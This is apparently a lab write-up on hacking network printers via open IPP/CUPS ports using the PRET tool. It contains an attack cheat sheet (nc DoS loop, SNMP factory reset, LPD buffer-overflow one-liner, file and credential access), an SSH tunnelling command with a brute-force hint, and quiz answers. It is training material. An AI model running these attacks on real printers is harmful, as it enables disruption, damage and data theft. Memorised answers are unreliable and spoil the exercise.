
# Printer Hacking 101

The reason behind the printers' vulnerability which effected those 50,000 printers, was simply an open IPP port. 

"The Internet Printing Protocol (IPP): is a specialized Internet protocol for communication between client devices and printers. It allows clients to submit one or more print jobs to the printer or print server, and perform tasks such as querying the status of a printer, obtaining the status of print jobs, or canceling individual print jobs."

When an IPP port is open to the internet, it is possible for anyone to print to the printer or even transfer malicious data through it (using it as a middleman for attacks). 

A recent study by VARIoT (Vulnerability and Attack Repository for IoT) showed that there are still around 80 thousand vulnerable printers opened to the world. Most of them appear to run the CUPS server (which is a simple UNIX printing system). 

- What port does IPP run on?
- `631`

## Locating and Exploiting local network printers 

- Github: https://github.com/RUB-NDS/PRET 

```
git clone https://github.com/RUB-NDS/PRET && cd PRET
python2 -m pip install colorama pysnmP
```

- run `python pret.py` for locating local printers in your local network

## Exploiting

There are exactly three options you need to try when exploiting a printer using PRET:
1. ps (Postscript)
2. pjl (Printer Job Language)
3. pcl (Printer Command Language)

### simple use

```
python pret.py {IP} pjl
python pret.py laserjet.lan ps
python pret.py /dev/usb/lp0 pcl  # works if you have a printer connected to your computer already
```

### Printer Security Testing Cheat Sheet

| Category                  | Attack                  | Protocol    | Testing                                                     |
|---------------------------|-------------------------|-------------|-------------------------------------------------------------|
| Denial of Service         | Transmission channel    | TCP         | while true; do nc printer 9108; done                        |
| Denial of Service         | Document processing     | PS / PJL    | PRET: disable, hang, offline                                |
| Denial of Service         | Physical damage         | PS / PJL    | PRET: destroy                                               |
| Privilege Escalation      | Factory defaults        | SNMP        | snmpset -v1 -c public printer                               |
|                           |                         |             |  1.3.6.1.2.1.43.5.1.1.3.1 i 6                               |
| Privilege Escalation      | Factory defaults        | PML / PSL   | PRET: reset                                                 |
| Privilege Escalation      | Accounting bypass       | TCP         | connect to printer directly (no server)                     |
| Privilege Escalation      | Accounting bypass       | IPP         | checks username w/o authorization                           |
| Privilege Escalation      | Accounting bypass       | PS          | checks if PostScript is preprocessed                        |
| Privilege Escalation      | Accounting bypass       | PJL         | PRET: pagecount                                             |
| Privilege Escalation      | Fax & Scanner           | multiple    | install printer driver & use fax/scan                       |
| Print job access          | print job retention     | PS          | PRET: capture                                               |
| Print job access          | print job manipulation  | PS          | PRET: cross, overlay, replace                               |
| Information disclosure    | Memory access           | PJL         | PRET: nvram dump                                            |
| Information disclosure    | File System Access      | PS / PJL    | PRET: fuzz, ls, get, put                                    |
| Information disclosure    | Credential disclosure   | PS / PJL    | PRET: lock, unlock                                          |
| Code Execution            | Buffer overflows        | PJL         | PRET: flood                                                 |
| Code Execution            | Buffer overflows        | LPD         | ./lpdtest.py printer in "'`python -c 'print "x"*3800`'"     |
| Code Execution            | Firmware updates        | PJL         | flip a bit, check if modified firmware accepted             |
| Code Execution            | Software packages       | multiple    | obtain a SDK and write your own app                         |

- PRET uses port 9000 by default

An ssh access to the machine allows you to set up ssh tunneling, opening all CUPS features and providing you an ability to use attached printers. SSH password can be easily brute-forced (weak password).

- `ssh printer@MACHINE_IP -T -L 3631:localhost:631`

---

How would a simple printer TCP DoS attack look as a one-line command?
- `while true; do nc printer 9100; done`

What attack are printers often vulnerable to which involves sending more and more information until a pre-allocated buffer size is surpassed?

- `Buffer Overflow`

Connect to the printer per the instructions above. Where's the Fox_Printer located?

- `Skidy's basement`

What is the size of a test sheet?

- `1k`

